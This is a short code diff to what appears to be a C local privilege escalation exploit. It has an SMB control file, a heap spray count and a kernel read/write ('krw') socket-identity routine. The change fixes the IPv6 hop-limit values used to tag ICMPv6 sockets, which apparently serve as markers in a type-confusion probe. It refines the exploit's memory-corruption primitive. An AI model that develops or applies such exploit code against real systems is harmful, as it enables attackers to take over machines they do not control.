@@ -40,7 +40,10 @@
 #define DEFAULT_CTL          "/tmp/lpe-smb-ctl.json"
 #define DEFAULT_IDENT_COUNT  256
 #define DEFAULT_SPRAY_COUNT  8000
-#define HOPS_BASE            0x4000
+/* IPV6_UNICAST_HOPS only accepts 0..255; identity sockets just need a
+ * valid value -- uniqueness during probing comes from the confusion-written
+ * marker (0x6000+i), not from these. */
+#define HOPS_BASE            1
 #define LEAK_FILE            "poc.bin"
 #define LEAK_SIZE            (WEBDAV_MAX_READ_VALUE)   /* 0x12d0000 */
 #define LEAK_OFFSET          4096
@@ -209,7 +212,7 @@ krw_identity_open(krw_t *k, int n, int hops_base)
     for (i = 0; i < n && k->nfds < (int)(sizeof(k->fds)/sizeof(k->fds[0]));
          i++) {
         int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
-        int hops = hops_base + k->nfds;
+        int hops = hops_base + (k->nfds % 254);   /* stay within 1..254 */
         if (fd < 0) {
             fprintf(stderr, "[krw] socket %d: %s\n", i, strerror(errno));
             break;
@@ -223,8 +226,8 @@ krw_identity_open(krw_t *k, int n, int hops_base)
         k->fds[k->nfds++] = fd;
     }
     fprintf(stderr, "[krw] identity set: %d ICMPv6 dgram sockets "
-            "(hops 0x%x..0x%x)\n", k->nfds, hops_base,
-            hops_base + k->nfds - 1);
+            "(hops %d..%d)\n", k->nfds, hops_base,
+            hops_base + (k->nfds ? (k->nfds - 1) % 254 : 0));
     return k->nfds;
 }
 
